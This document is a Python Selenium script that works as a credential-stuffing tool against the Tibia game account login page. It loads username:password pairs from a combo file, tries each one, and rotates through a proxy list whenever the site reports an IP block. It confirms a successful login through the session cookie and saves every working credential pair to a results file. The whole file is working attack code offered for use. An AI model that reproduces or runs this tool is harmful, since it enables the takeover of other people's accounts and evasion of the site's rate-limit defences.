from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException,NoSuchElementException
import time


class Credential:
  def __init__(self, username, password):
    self.username = username
    self.password = password

class ResultMessage:
    def __init__(self,credential,result,message,proxyId = 0):
        self.credential = credential
        self.result = result
        self.message = message
        self.proxyId = proxyId
    
def wait(min):
    mins = 0
    while(mins != min):
          print(">>>>>>>>>>>>>>>>>>>>>", mins)
          time.sleep(60)
          mins += 1




def getProxyListFromFile():
    proxyList = []
    f=open("PROXY-LIST.txt","r")
    f1 = f.readlines()
    for line in f1:
        proxyList.append(line)
    return proxyList

def saveCredntialResultToFile(credential,fileName):
    f=open(fileName, "a+")
    f.write(credential.username + ":" + credential.password)
    f.close()

#getProxyFrom proxylist
def getProxy(proxyId,proxy):
    lenght = len(proxy)
    if lenght >  proxyId :
        return proxy[proxyId]
    raise ValueError('The Proxy limit was reached , stoped program')


def getCredentialsFromFile():
    credentials = []
    f=open("TIBIA-MIX.txt", "r")
    f1 = f.readlines()
    for line in f1:
        result = line.split(':')
        username = result[0]
        password = result[1]
        crednetial = Credential(username,password)
        credentials.append(crednetial)
    f.close()
    return credentials

def resolveException(exceptionMessage,credential):
    f=open('exceptions.txt', "a+")
    f.write("Exception message: " + exceptionMessage + " Credentials:" + credential.username + ":" + credential.password)
    f.close()

def loginToTibiaAccount(credential,browser):
    usernameStr = credential.username
    passwordStr = credential.password
    print('Trying to login by following account ' + usernameStr + ' ' )
    try:
        browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
        username = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginname')))
        username.send_keys(usernameStr)
        password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginpassword')))
        password.send_keys(passwordStr)
    except TimeoutException:
        print("Timeout exception")
        resolveException('Tiemout exception',credential)
        return ResultMessage(credential,False,'TimeoutException')
    except:
        print('Some another exception occured')
        resolveException('Some another exception occured',credential)
        return ResultMessage(credential,False,'Some another exception occured')
    return ResultMessage(credential,True,'')

def checkErrorMessage(browser,credential):
    try:        
        errorMessage = browser.find_element_by_class_name('ErrorMessage')
        errorText = errorMessage.text
        ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
        if ipBlockText in errorText:
            print("Block ip error")
            return ResultMessage(credential,True,'Block ip error')
    except NoSuchElementException:
        print('No Error message!')
        resolveException('No error message, NoSuchElementException',credential)
        return ResultMessage(credential,True,'No error')
    except:
        print("Error message not found")
        resolveException('Error message not found',credential)
        return ResultMessage(credential,False,'Error message not found')
    return ResultMessage(credential,True,'No errors!')

def getUpBrowser(proxyId,proxyList,timeout):
    if(proxyId >= 0):
        proxy = proxyList[proxyId]
        print('Going with proxy: '+ proxy)
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--proxy-server=%s' % proxy)
        browser = webdriver.Chrome(options=chrome_options)
        browser.set_page_load_timeout(timeout)
    else:
        browser = webdriver.Chrome()
        browser.set_page_load_timeout(timeout)

    return browser


def loginWithCredential(credential,timeout,proxyId,proxyList):

    proxyLength = len(proxyList)
    if(proxyLength == proxyId):
        return ResultMessage(credential,True,'End of proxy list, ending execution of program',proxyId)

    browser = getUpBrowser(proxyId,proxyList,timeout)
    loginResult = loginToTibiaAccount(credential,browser)
    
    #not succesful login lets try with proxy on failure
    if(not loginResult.result):
           return goWithNextProxy(browser,proxyId,credential,timeout,proxyList)

    errorMessage = checkErrorMessage(browser,credential)

    #when error message found and it is block ip error go with proxy
    if(errorMessage.result):
        if errorMessage.message in 'Block ip error':
            return goWithNextProxy(browser,proxyId,credential,timeout,proxyList)

    checkIsLoginSuccesfully(browser,loginResult,errorMessage,credential)
    
    return ResultMessage(credential,False,'',proxyId)

def checkIsLoginSuccesfully(browser,loginResult,errorMessage,credential):
    if(loginResult.result and errorMessage.result):
        print('Trying to get cookei for ' + credential.username)
        cookie = browser.get_cookie('SecureSessionID')
        if cookie != None:
            print("Cookie found, logged succesfuly with credentials:" + credential.username + ":" + credential.password)
            saveCredntialResultToFile(credential,"results.txt") 
            browser.quit()
        else:
            #no cookie so , just get out of here and clsoe!
            print('cookie not found, user not logged')
            browser.quit()
    else:
        #nothing spectaculary happened just wrong credentials
        print(errorMessage.message)
        browser.quit()

def goWithNextProxy(browser,proxyId,credential,timeout,proxyList):
    browser.quit()
    proxyId = proxyId + 1
    resultMessage = loginWithCredential(credential,timeout,proxyId,proxyList)
    proxyId = resultMessage.proxyId
    if(resultMessage.result):
        return resultMessage
    else:
        return ResultMessage(credential,False,'',proxyId)

def processLogin(timeout):
    proxyId = -1

    proxyList = getProxyListFromFile()
    credentials = getCredentialsFromFile()

    for credential in credentials:
        resultMessage = loginWithCredential(credential,timeout,proxyId,proxyList)
        if(resultMessage.result):
            print('End exectuion of procces login')
            print(resultMessage.message)
            break
        else:
            proxyId = resultMessage.proxyId
    
processLogin(120)
       
